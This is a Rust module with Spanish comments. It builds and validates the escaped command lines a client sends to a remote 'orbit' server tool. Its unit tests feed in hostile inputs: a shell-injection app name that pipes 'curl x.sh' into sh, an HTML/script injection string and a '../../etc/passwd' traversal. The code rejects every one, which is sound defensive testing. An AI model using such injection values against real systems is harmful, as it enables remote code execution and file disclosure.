//! El catálogo de órdenes que el cliente puede pedirle a un servidor.
//!
//! Es finito y está en un solo fichero **a propósito**: la regla nº 1 dice que
//! la interfaz sólo invoca `orbit`, y una regla así sólo es auditable si se
//! puede comprobar leyendo un sitio. Si esta lista crece, la superficie crece —
//! y crece en silencio si está repartida por veinte pantallas.
//!
//! La interfaz **no construye un `argv` a mano**. Construye un [`Comando`], y
//! este módulo lo traduce. El motivo es de corrección antes que de seguridad: un
//! `argv` escrito a mano en veinte sitios se equivoca en el sitio diecinueve, y
//! equivocarse aquí significa concatenar.
//!
//! Y hay reglas del servidor que aquí se convierten en imposibles de expresar,
//! que es mejor que convertirlas en errores en tiempo de ejecución:
//!
//! - `orbit deploy --json` **aborta sin el nombre de la app**, y `--pick` está
//!   prohibido con `--json`. Aquí el nombre es obligatorio en el tipo.
//! - Sin terminal, un comando sin app **no aborta: elige la primera por orden
//!   alfabético y sale con 0**. Con `restart` eso es reiniciar la app
//!   equivocada sin que nada lo diga. Por eso **ninguna variante de aquí puede
//!   omitir la app**.
//! - `--json` va **siempre delante**. Detrás, un comando que no lo habla se lo
//!   traga en silencio y sale con 0, porque no todos filtran lo que no conocen.
//!   Delante siempre muere, que es un comportamiento definido.

use crate::shquote;

/// Los campos con forma conocida se validan **antes** de construir la orden.
///
/// Esto es defensa en profundidad, **no** la defensa: el escapado es lo que
/// protege, y esto va encima. El orden importa —escapar siempre, validar
/// además—; quien lo hace al revés acaba con un filtro que crece cada vez que
/// alguien encuentra un carácter nuevo, que es la firma de que el diseño estaba
/// mal.
///
/// Lo que sí aporta: convierte un ataque en un mensaje de error legible, y
/// atrapa el caso que el escapado no puede atrapar — un nombre de app que llega
/// **del propio servidor**. `app_names()` en Orbit enumera los `.conf` sin
/// filtrar, así que un servidor con root comprometido puede meter ahí lo que
/// quiera. **Un dato que ha dado la vuelta por el servidor no es de más
/// confianza que uno tecleado: es de menos.**
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ErrorForma {
    NombreDeApp(String),
    ClaveDeEntorno(String),
    Release(String),
    Escapado(shquote::ErrorEscapado),
}

impl std::fmt::Display for ErrorForma {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NombreDeApp(s) => write!(f, "«{s}» no tiene forma de nombre de app"),
            Self::ClaveDeEntorno(s) => write!(f, "«{s}» no tiene forma de variable de entorno"),
            Self::Release(s) => write!(f, "«{s}» no tiene forma de release"),
            Self::Escapado(e) => write!(f, "{e}"),
        }
    }
}

impl std::error::Error for ErrorForma {}

/// Copiada de `_app_name_ok` del Orbit real: `^[a-z0-9][a-z0-9._-]{0,39}$`, sin
/// `..`. Se copia en vez de inventarse porque el servidor es quien manda sobre
/// qué nombres existen.
///
/// Un nombre que no encaje **no se arregla**: un nombre arreglado ya no
/// identifica a nadie. Se enseña marcado y no se opera sobre él.
pub fn nombre_de_app_valido(s: &str) -> bool {
    if s.is_empty() || s.len() > 40 || s.contains("..") {
        return false;
    }
    let mut cs = s.chars();
    let primero = cs.next().unwrap();
    if !(primero.is_ascii_lowercase() || primero.is_ascii_digit()) {
        return false;
    }
    s.chars()
        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '.' | '_' | '-'))
}

/// Copiada de `_env_key_ok`: `^[A-Za-z_][A-Za-z0-9_]*$`.
pub fn clave_de_entorno_valida(s: &str) -> bool {
    let mut cs = s.chars();
    match cs.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    cs.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Deducida del formato `%Y%m%d-%H%M%S` con sufijo `-2`, `-3`… para las
/// colisiones dentro del mismo segundo.
pub fn release_valida(s: &str) -> bool {
    let (fecha, resto) = match s.split_once('-') {
        Some(v) => v,
        None => return false,
    };
    if fecha.len() != 8 || !fecha.chars().all(|c| c.is_ascii_digit()) {
        return false;
    }
    let (hora, sufijo) = match resto.split_once('-') {
        Some((h, s)) => (h, Some(s)),
        None => (resto, None),
    };
    if hora.len() != 6 || !hora.chars().all(|c| c.is_ascii_digit()) {
        return false;
    }
    match sufijo {
        None => true,
        Some(s) => !s.is_empty() && s.chars().all(|c| c.is_ascii_digit()),
    }
}

/// Qué se le puede pedir a un servidor. **Este enumerado es la superficie.**
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Comando {
    /// El saludo. Lo primero que se pregunta siempre.
    Version,
    Lista,
    /// Trae el array de apps **completo e idéntico** al de `Lista`, comprobado
    /// carácter a carácter. Así la portada cuesta una llamada y no dos.
    Estado,
    Info {
        app: String,
    },
    Doctor,
    /// Aplica lo que se puede arreglar sin decidir nada por nadie.
    ///
    /// Lleva `--yes` porque el servidor lo exige con `--json`: sin terminal no
    /// hay a quién preguntar, y dar por hecho que alguien ha dicho que sí sería
    /// aplicar cambios en su servidor sin que los acepte. La confirmación la
    /// pide la interfaz, que sí tiene delante a una persona.
    DoctorArreglar,
    /// Tarda ~1 s a propósito: la CPU es la diferencia entre dos lecturas, y una
    /// foto suelta tiene que esperar a la segunda. Con 40 apps son ~2,1 s.
    Top,
    Metricas {
        app: Option<String>,
    },
    Trafico {
        app: String,
        desde: Option<String>,
    },
    /// Devuelve sólo los **nombres**. Los secretos no cruzan el contrato.
    EntornoLista {
        app: String,
    },
    /// Un valor, pelado. Es un acto deliberado por comando, y así debe seguir.
    EntornoValor {
        app: String,
        clave: String,
    },
    BaseDeDatosLista,
    RedireccionesLista {
        app: Option<String>,
    },
    VigilanciaEstado,
    ColaEstado,
    CopiasLista,
    CopiasVerificar,
    /// NDJSON, y es la única excepción del contrato. Con `--json` no sigue en
    /// vivo salvo que se pida.
    Logs {
        app: String,
        desde: Option<String>,
        lineas: Option<u32>,
        seguir: bool,
        solo_nginx: bool,
    },
    /// El nombre es obligatorio: con `--json` el servidor aborta sin él.
    Desplegar {
        app: String,
        progreso: bool,
    },
    DesplegarTodo {
        progreso: bool,
    },
    /// La release es obligatoria: sin ella y sin terminal, `rollback` aborta —y
    /// hace bien, porque el «valor por defecto» sería la que ya está activa.
    Revertir {
        app: String,
        release: String,
    },
}

impl Comando {
    /// El `argv` completo, con la ruta absoluta del binario delante.
    ///
    /// **Nunca por `PATH`**: un `PATH` manipulado en el `.bashrc` del usuario
    /// remoto —o por quien sólo tenga escritura en su `$HOME`— redirige todos
    /// los comandos a otro binario.
    pub fn argv(&self, binario: &str) -> Result<Vec<String>, ErrorForma> {
        let app_ok = |a: &String| -> Result<String, ErrorForma> {
            if nombre_de_app_valido(a) {
                Ok(a.clone())
            } else {
                Err(ErrorForma::NombreDeApp(a.clone()))
            }
        };

        let mut v: Vec<String> = vec![binario.to_string()];
        // '--json' delante del subcomando, siempre. Es la única posición con un
        // comportamiento definido.
        let json = |v: &mut Vec<String>| v.push("--json".into());

        match self {
            Self::Version => {
                json(&mut v);
                v.push("version".into());
            }
            Self::Lista => {
                json(&mut v);
                v.push("list".into());
            }
            Self::Estado => {
                json(&mut v);
                v.push("status".into());
            }
            Self::Doctor => {
                json(&mut v);
                v.push("doctor".into());
            }
            Self::DoctorArreglar => {
                json(&mut v);
                v.extend(["doctor".into(), "--fix".into(), "--yes".into()]);
            }
            Self::Top => {
                json(&mut v);
                v.push("top".into());
            }
            Self::BaseDeDatosLista => {
                json(&mut v);
                v.extend(["db".into(), "list".into()]);
            }
            Self::VigilanciaEstado => {
                json(&mut v);
                v.extend(["watch".into(), "status".into()]);
            }
            Self::ColaEstado => {
                json(&mut v);
                v.extend(["queue".into(), "status".into()]);
            }
            Self::CopiasLista => {
                json(&mut v);
                v.extend(["backup".into(), "list".into()]);
            }
            Self::CopiasVerificar => {
                json(&mut v);
                v.extend(["backup".into(), "verify".into()]);
            }
            Self::Info { app } => {
                json(&mut v);
                v.push("info".into());
                v.push(app_ok(app)?);
            }
            Self::Metricas { app } => {
                json(&mut v);
                v.push("metrics".into());
                if let Some(a) = app {
                    v.push(app_ok(a)?);
                }
            }
            Self::Trafico { app, desde } => {
                json(&mut v);
                v.push("traffic".into());
                v.push(app_ok(app)?);
                if let Some(d) = desde {
                    v.push("--since".into());
                    v.push(d.clone());
                }
            }
            Self::EntornoLista { app } => {
                json(&mut v);
                v.extend(["env".into(), "list".into()]);
                v.push(app_ok(app)?);
            }
            Self::EntornoValor { app, clave } => {
                // Sin '--json': 'env get' imprime el valor pelado, a propósito.
                if !clave_de_entorno_valida(clave) {
                    return Err(ErrorForma::ClaveDeEntorno(clave.clone()));
                }
                v.extend(["env".into(), "get".into()]);
                v.push(app_ok(app)?);
                v.push(clave.clone());
            }
            Self::RedireccionesLista { app } => {
                json(&mut v);
                v.extend(["redirect".into(), "list".into()]);
                if let Some(a) = app {
                    v.push(app_ok(a)?);
                }
            }
            Self::Logs {
                app,
                desde,
                lineas,
                seguir,
                solo_nginx,
            } => {
                json(&mut v);
                v.push("logs".into());
                v.push(app_ok(app)?);
                if let Some(d) = desde {
                    v.push("--since".into());
                    v.push(d.clone());
                }
                if let Some(n) = lineas {
                    v.push("--lines".into());
                    v.push(n.to_string());
                }
                if *seguir {
                    v.push("--follow".into());
                }
                if *solo_nginx {
                    v.push("--nginx".into());
                }
            }
            Self::Desplegar { app, progreso } => {
                json(&mut v);
                v.push("deploy".into());
                v.push(app_ok(app)?);
                if *progreso {
                    v.push("--progress".into());
                }
            }
            Self::DesplegarTodo { progreso } => {
                json(&mut v);
                v.extend(["deploy".into(), "--all".into()]);
                if *progreso {
                    v.push("--progress".into());
                }
            }
            Self::Revertir { app, release } => {
                if !release_valida(release) {
                    return Err(ErrorForma::Release(release.clone()));
                }
                v.push("rollback".into());
                v.push(app_ok(app)?);
                v.push(release.clone());
            }
        }
        Ok(v)
    }

    /// La orden ya escapada, lista para el shell remoto.
    pub fn linea(&self, binario: &str) -> Result<String, ErrorForma> {
        let argv = self.argv(binario)?;
        shquote::build(&argv).map_err(ErrorForma::Escapado)
    }

    /// Si la respuesta es un único objeto JSON o un flujo NDJSON. `logs` es la
    /// única excepción, y se declara aquí para que el transporte no tenga que
    /// adivinarlo.
    pub fn es_flujo(&self) -> bool {
        matches!(self, Self::Logs { .. })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    const B: &str = "/usr/local/bin/orbit";

    #[test]
    fn el_json_va_siempre_delante() {
        let v = Comando::Lista.argv(B).unwrap();
        assert_eq!(v, [B, "--json", "list"]);
        // Detrás, un comando que no lo habla se lo traga en silencio y sale
        // con 0. Delante siempre muere. Sólo una de las dos es un contrato.
        assert_eq!(v[1], "--json");
    }

    #[test]
    fn nunca_se_invoca_por_path() {
        for c in [Comando::Version, Comando::Lista, Comando::Doctor] {
            assert!(c.argv(B).unwrap()[0].starts_with('/'));
        }
    }

    #[test]
    fn un_nombre_de_app_hostil_no_llega_a_construir_la_orden() {
        let malo = "a'; curl x.sh|sh; '".to_string();
        let r = Comando::Info { app: malo.clone() }.argv(B);
        assert_eq!(r, Err(ErrorForma::NombreDeApp(malo)));
    }

    #[test]
    fn un_nombre_con_marcado_tampoco() {
        let r = Comando::Info {
            app: "</script><img src=x>".into(),
        }
        .argv(B);
        assert!(matches!(r, Err(ErrorForma::NombreDeApp(_))));
    }

    #[test]
    fn la_regla_del_nombre_es_la_del_servidor() {
        assert!(nombre_de_app_valido("mi-web"));
        assert!(nombre_de_app_valido("viejo.com")); // las redirecciones de dominio
        assert!(nombre_de_app_valido("a"));
        assert!(nombre_de_app_valido(&"a".repeat(40)));
        assert!(!nombre_de_app_valido(&"a".repeat(41)));
        assert!(!nombre_de_app_valido("Web")); // sin mayúsculas
        assert!(!nombre_de_app_valido("-web")); // no empieza por guion
        assert!(!nombre_de_app_valido("a..b")); // travesía de rutas
        assert!(!nombre_de_app_valido(""));
        assert!(!nombre_de_app_valido("оrbit")); // o cirílica
    }

    #[test]
    fn una_release_inventada_se_rechaza() {
        assert!(release_valida("20260805-041230"));
        assert!(release_valida("20260805-041230-2"));
        assert!(!release_valida("../../etc/passwd"));
        assert!(!release_valida("current"));
        let r = Comando::Revertir {
            app: "web".into(),
            release: "current".into(),
        }
        .argv(B);
        assert!(matches!(r, Err(ErrorForma::Release(_))));
    }

    #[test]
    fn una_clave_de_entorno_inventada_se_rechaza() {
        assert!(clave_de_entorno_valida("DB_PASSWORD"));
        assert!(!clave_de_entorno_valida("DB-PASSWORD"));
        assert!(!clave_de_entorno_valida("1DB"));
        let r = Comando::EntornoValor {
            app: "web".into(),
            clave: "a b".into(),
        }
        .argv(B);
        assert!(matches!(r, Err(ErrorForma::ClaveDeEntorno(_))));
    }

    #[test]
    fn env_get_no_lleva_json_porque_imprime_el_valor_pelado() {
        let v = Comando::EntornoValor {
            app: "web".into(),
            clave: "DB_PASSWORD".into(),
        }
        .argv(B)
        .unwrap();
        assert!(!v.iter().any(|x| x == "--json"));
    }

    #[test]
    fn arreglar_lleva_el_yes_que_el_servidor_exige() {
        // Sin `--yes`, `doctor --fix --json` se niega: sin terminal no hay a
        // quién preguntar. Y ese camino estuvo documentado y MUERTO durante
        // versiones, porque `--yes` no era una bandera global — así que contra
        // un servidor viejo esto falla, y la interfaz vuelve a enseñar la orden
        // para copiar.
        let v = Comando::DoctorArreglar.argv(B).unwrap();
        assert_eq!(v, [B, "--json", "doctor", "--fix", "--yes"]);
    }

    #[test]
    fn logs_es_el_unico_flujo() {
        assert!(Comando::Logs {
            app: "web".into(),
            desde: None,
            lineas: None,
            seguir: false,
            solo_nginx: false
        }
        .es_flujo());
        assert!(!Comando::Lista.es_flujo());
        assert!(!Comando::Desplegar {
            app: "web".into(),
            progreso: true
        }
        .es_flujo());
    }

    #[test]
    fn la_linea_queda_escapada() {
        let l = Comando::Trafico {
            app: "mi-web".into(),
            desde: Some("7d".into()),
        }
        .linea(B)
        .unwrap();
        assert_eq!(l, "/usr/local/bin/orbit --json traffic mi-web --since 7d");
    }

    #[test]
    fn el_catalogo_no_puede_expresar_una_orden_sin_app() {
        // No hay ninguna variante con la app opcional donde el servidor elegiría
        // la primera por orden alfabético. Si alguien añade una, este test no la
        // ve — pero la revisión de este fichero sí, y ése es el sitio.
        let c = Comando::Info { app: String::new() };
        assert!(c.argv(B).is_err());
    }
}
